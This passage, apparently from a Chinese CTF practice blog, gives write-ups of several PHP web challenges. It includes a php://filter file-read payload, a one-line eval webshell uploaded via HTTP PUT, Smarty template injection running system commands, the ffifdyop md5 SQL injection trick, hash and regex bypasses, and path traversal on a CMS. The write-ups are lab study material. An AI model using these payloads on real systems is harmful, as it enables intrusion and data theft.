punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token string double-quoted-string\">\"php\"</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Nice!!!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Hacker!!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">//flag.php</span></span></pre></td></tr></table></figure><p>简单题，右手就行。</p>\n<p>payload:</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?file=<span class=\"token property\">php</span><span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/convert.base64-encode/resource=/flag</span></pre></td></tr></table></figure><h3 id=\"nssround1-basicbasic_check\"><a class=\"anchor\" href=\"#nssround1-basicbasic_check\">#</a> [NSSRound#1 Basic]basic_check</h3>\n<h4 id=\"http协议dav\"><a class=\"anchor\" href=\"#http协议dav\">#</a> HTTP 协议，DAV</h4>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// Welcome to NSSCTF Round#1 Basic, have fun.</span></span></pre></td></tr></table></figure><p>用 curl 或者 nikto 扫描 /index.php 就知道可以使用 PUT 请求。</p>\n<p>或者可以用火狐浏览器的开发者工具，选择网络，右键网站，编辑并重发，将 GET 修改为 OPTIONS 后，发送，响应头中有这一串：</p>\n<blockquote>\n<p>OPTIONS,GET,HEAD,POST,DELETE,TRACE,PROPFIND,PROPPATCH,COPY,MOVE,PUT,LOCK,UNLOCK</p>\n</blockquote>\n<p>这就很简单了，因为它允许看起来就很变态的 PUT 请求。</p>\n<p>关于 PUT 请求有个简短的介绍：</p>\n<blockquote>\n<p>如果请求 URI（Request-URI）指定的的资源已经在源服务器上存在，那么此请求里的实体应该被当作是源服务器关于此 URI 所指定资源实体的最新修改版本。如果请求 URI（Request-URI）指定的资源不存在，并且此 URI 被用户代理定义为一个新资源，那么源服务器就应该根据请求里的实体创建一个此 URI 所标识下的资源</p>\n</blockquote>\n<p>具体可以参考这篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9qdWVqaW4uY24vcG9zdC83MjM5NTg2NDE2ODgzMTIyMjM1\">详解 HTTP 四种请求：POST、GET、DELETE、PUT</span></p>\n<p>所以我们可以对 index.php 进行抓包，修改请求头为 PUT，并修改为 1.php，由于 1.php 不存在，所以自动创建，内容就是下面写的一句话木马。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>  @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>发送后再去浏览器访问 1.php，用蚁剑连接即可。</p>\n<h2 id=\"2023922\"><a class=\"anchor\" href=\"#2023922\">#</a> 2023/9/22</h2>\n<p>（从今天开始到月底，由于要去参加 buuctf 和 polar 以及山河的线上个人赛，每天的更新频率会降低，尽量保持一天一更吧～）</p>\n<h3 id=\"hdctf-2023searchmaster\"><a class=\"anchor\" href=\"#hdctf-2023searchmaster\">#</a> [HDCTF 2023]SearchMaster</h3>\n<h4 id=\"smartyssti信息收集模板注入\"><a class=\"anchor\" href=\"#smartyssti信息收集模板注入\">#</a> Smarty,SSTI, 信息收集，模板注入</h4>\n<p>进入题目后看到提示：</p>\n<blockquote>\n<p>模板都一样我很抱歉 OVO BUT YOU CAN POST ME A data</p>\n</blockquote>\n<p>虽然不知道他是什么模板，但能看出要求我们传入一个名为 data 的 post 参数。</p>\n<p>验证一下</p>\n<blockquote>\n<p>data=1</p>\n</blockquote>\n<p>发现在页面会显示我们传入的数据。</p>\n<p>尝试命令注入啥的都不行，试试：</p>\n<blockquote 3*3=\"\">\n<p>data=</p>\n</blockquote>\n<p>发现回显出 9，这熟悉的感觉让人很难不想起那位。</p>\n<blockquote system(ls)=\"\">\n<p>data=</p>\n</blockquote>\n<p>回显出</p>\n<blockquote>\n<p>composer.json css demo docs index.php js lexer libs templates_c templates_c</p>\n</blockquote>\n<p>做到这基本没什么了，直接查看 flag 即可。</p>\n<p>关于 smart 模板注入在之前的题目可以参考。</p>\n<blockquote system(catflag*)=\"\">\n<p system(ls)=\"\">data=</p>\n<p>data=</p>\n</blockquote>\n<h2 id=\"2023923\"><a class=\"anchor\" href=\"#2023923\">#</a> 2023/9/23</h2>\n<h3 id=\"鹤城杯-2021middle-magic\"><a class=\"anchor\" href=\"#鹤城杯-2021middle-magic\">#</a> [鹤城杯 2021] Middle magic</h3>\n<h4 id=\"弱比较数组绕过正则绕过php\"><a class=\"anchor\" href=\"#弱比较数组绕过正则绕过php\">#</a> 弱比较，数组绕过，正则绕过，php</h4>\n<p>题目源代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"./flag.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"./result.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'aaa'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'aaa'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token variable\">$aaa</span> <span class=\"token operator\">=</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^(.*)level(.*)$/'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'$&#123;1&#125;&lt;!-- filtered -->$&#123;2&#125;'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'aaa'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/pass_the_level_1#/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$aaa</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"here is level 2\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'root_pwd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'root_pwd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;p>The level 2 can not pass!&lt;/p>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token comment\">// START FORM PROCESSING    </span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'root_pwd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"here is level 3,do you kown how to overcome it?\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'level_3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                    <span class=\"token variable\">$level_3</span> <span class=\"token operator\">=</span> <span class=\"token function\">json_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'level_3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                    </pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$level_3</span><span class=\"token operator\">-></span><span class=\"token property\">result</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                        </pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"success:\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"you never beat me!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"out\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                </pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token comment\">// perform validations on the form data</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;p>out!&lt;/p>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'nonono!'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;hr>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>这种 php 代码审计题不会太难，耐着性子看下去就能做出来。</p>\n<p>首先得传入一个名为 aaa 的 get 参数，并且长度要小于 20.</p>\n<p>然后就是本题的难点：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$aaa</span> <span class=\"token operator\">=</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^(.*)level(.*)$/'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'$&#123;1&#125;&lt;!-- filtered -->$&#123;2&#125;'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'aaa'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/pass_the_level_1#/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$aaa</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"here is level 2\"</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>如何绕过这句话。</p>\n<p>这句话意思就是说，只要我们传入的参数里面有 'level'，就会被替换成 '&lt;!-- filtered --&gt;'</p>\n<p>而下一句话又必须是 'pass_the_level_1#'。</p>\n<p>但这种正则写法是存在缺陷的: <code>.</code>  用于任意字符匹配并不包括换行符，而且 <code>^ $</code>  界定了必须在同一行，否则匹配不到，直接利用 <code>%0a</code>  进行绕过。</p>\n<p>对于为什么要用 <code>%23</code> , 不用 <code>#</code> ?</p>\n<p>因为 URL 中的 #是位置标识符</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVhbnlpZmVuZy5jb20vYmxvZy8yMDExLzAzL3VybF9oYXNoLmh0bWw=\">可以看看这个文章</span></p>\n<p>而对于正则匹配绕过的一些细节和资料，可以参考这两篇：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vejJuMy9wLzE3MjcyNzU0Lmh0bWw=\">preg_match 绕过</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNjE0MTQx\">有关于正则匹配的 s 和 m 修饰符的小 Tip</span></p>\n<p>所以使用：</p>\n<blockquote>\n<p>?aaa=%0apass_the_level_1%23</p>\n</blockquote>\n<p>就可以绕过第一层。</p>\n<p>进入第二层，让我们传入 post 参数 admin 和 root_pwd，并要求他两不能相等，且 sha 加密后的值相等，由于 sha 函数和 md5 函数类似，均不可处理数组，所以我们可以采用数组绕过：</p>\n<blockquote>\n<p>admin[]=1&amp;root_pwd[]=2</p>\n</blockquote>\n<p>然后是最后一层，将我们传入的 level_3 转换为 json 格式后，要求和变量 result 弱比较相等，这里我们并不知道变量 result 是个什么东东，但是 php 里面有个很好用的东西，就是布尔值 True 除了与 0,False 比较不相等，和其他任意值弱比较返回值皆为真。</p>\n<p>所以可以这样：</p>\n<blockquote result:True=\"\">\n<p>admin[]=1&amp;root_pwd[]=2&amp;level_3=</p>\n</blockquote>\n<p>当然，也可以传入其他值，这里经过尝试发现字符串都可以。</p>\n<h2 id=\"2023924\"><a class=\"anchor\" href=\"#2023924\">#</a> 2023/9/24</h2>\n<h3 id=\"hnctf-2022-week1easy_upload\"><a class=\"anchor\" href=\"#hnctf-2022-week1easy_upload\">#</a> [HNCTF 2022 Week1]easy_upload</h3>\n<h4 id=\"文件上传一句话木马\"><a class=\"anchor\" href=\"#文件上传一句话木马\">#</a> 文件上传，一句话木马</h4>\n<p>很简单的文件上传题目，一句话木马就可以解决，不过这题目标签可还行......</p>\n<h2 id=\"2023925\"><a class=\"anchor\" href=\"#2023925\">#</a> 2023/9/25</h2>\n<h3 id=\"swpuctf-2022-新生赛奇妙的md5\"><a class=\"anchor\" href=\"#swpuctf-2022-新生赛奇妙的md5\">#</a> [SWPUCTF 2022 新生赛] 奇妙的 MD5</h3>\n<h4 id=\"弱比较数组绕过md5碰撞代码审计\"><a class=\"anchor\" href=\"#弱比较数组绕过md5碰撞代码审计\">#</a> 弱比较，数组绕过，md5 碰撞，代码审计。</h4>\n<p>真的很奇妙的一道题，奇妙到你要是知道这个奇妙的东西，你会觉得这题简单的真奇妙！</p>\n<p>进入题目只有一个提交框和一串描述：</p>\n<blockquote>\n<p>可曾听过 ctf 中一个奇妙的字符串</p>\n</blockquote>\n<p>打开源代码，没用。</p>\n<p>打开开发者工具，查看网络，在响应包的标头看到：</p>\n<blockquote>\n<p>select * from 'admin' where password=md5($pass,true)</p>\n</blockquote>\n<p>对于这句话，我们可以使用这个字符串进行绕过：</p>\n<p>ffifdyop</p>\n<p>经过 md5 加密后：276f722736c95d99e921722cf9ed621c</p>\n<p>再转换为字符串：'or'6 &lt;乱码&gt;  即  'or'66�]��!r,��b</p>\n<p>用途：</p>\n<p>select * from admin where password=''or'6 &lt;乱码&gt;'</p>\n<p>就相当于 select * from admin where password=''or 1  实现 sql 注入</p>\n<p>输入后页面跳转：</p>\n<blockquote>\n<p>仔细想想在哪里找线索</p>\n</blockquote>\n<p>检查网页源代码发现：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">&lt;!--</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$x= $GET['x'];</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>$y = $_GET['y'];</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>if($x != $y &amp;&amp; md5($x) == md5($y))&#123;</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    ;</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>--></span></pre></td></tr></table></figure><p>数组绕过：</p>\n<blockquote>\n<p>?x[]=1&amp;y[]=2</p>\n</blockquote>\n<p>再次跳转：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'wqh'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!==</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'dsy'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'wqh'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'dsy'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$FLAG</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>继续数组绕过：</p>\n<blockquote>\n<p>wqh[]=1&amp;dsy[]=2</p>\n</blockquote>\n<h2 id=\"2023926\"><a class=\"anchor\" href=\"#2023926\">#</a> 2023/9/26</h2>\n<h3 id=\"gkctf-2021easycms\"><a class=\"anchor\" href=\"#gkctf-2021easycms\">#</a> [GKCTF 2021]easycms</h3>\n<h4 id=\"弱口令rce目录穿越文件上传信息收集\"><a class=\"anchor\" href=\"#弱口令rce目录穿越文件上传信息收集\">#</a> 弱口令，RCE，目录穿越，文件上传，信息收集。</h4>\n<p>说起来这还是我第一次接触这种类似真实渗透环境的题目。</p>\n<p>进入题目后是一个精美的界面，源代码和开发者工具中并不存在什么有用的信息，这种没什么入手点的就可以扫一下网页，看看有没有什么其他可用的界面。</p>\n<p>扫到了 admin.php。</p>\n<p>用户名猜测 admin，密码简单爆破一下，得到 12345.</p>\n<p>登录。</p>\n<p>进入后台管理，经过一番分析和尝试后发现在设计 - 主题 - 自定义 - 导出主题 可以下载文件</p>\n<p><img data-src=\"../../../images/Iknowyouwillstop/2108.png\" alt=\"2108\" /></p>\n<p>那几栏必填的随便写。</p>\n<p>然后打开你浏览器的下载记录，复制压缩包的链接地址：</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL25vZGU0LmFubmEubnNzY3RmLmNuOjI4NDExL2FkbWluLnBocD9tPXVpJmFtcDtmPWRvd25sb2FkdGhlbWUmYW1wO3RoZW1lPUwzWmhjaTkzZDNjdmFIUnRiQzl6ZVhOMFpXMHZkRzF3TDNSb1pXMWxMMlJsWm1GMWJIUXZaaTU2YVhBPQ==\">http://node4.anna.nssctf.cn:28411/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvZi56aXA=</span></p>\n</blockquote>\n<p>将主题那一栏解码：</p>\n<p>/var/www/html/system/tmp/theme/default/f.zip</p>\n<p>可以看到它的路径，那么我们可以猜测 flag 在根目录，将 /flag 编码后替换主题那一栏位置，搜索网址：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL25vZGU0LmFubmEubnNzY3RmLmNuOjI4NDExL2FkbWluLnBocD9tPXVpJmFtcDtmPWRvd25sb2FkdGhlbWUmYW1wO3RoZW1lPUwyWnNZV2M9\">http://node4.anna.nssctf.cn:28411/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L2ZsYWc=</span></p>\n<p>得到一个压缩包，改为 txt 文件后缀查看即为 flag。</p>\n<p>还有一种方法就是进到后台发现 设计 -&gt; 主题 -&gt; 首页处可以编辑页面，支持 php 源代码，于是考虑插入 php 在网站页面爆出 flag，随便找个地方，比如 头部 处写一个 php 试试，保存时出现让我们创建一个文件的提示</p>\n<p>所以需要构造出这样一个文件，在 设计 -&gt; 组件 -&gt; 素材库 发现上传文件入口，先随便上传一个本地 txt，根据先前编辑页面的路径，将上传到素材库的文件重命名为 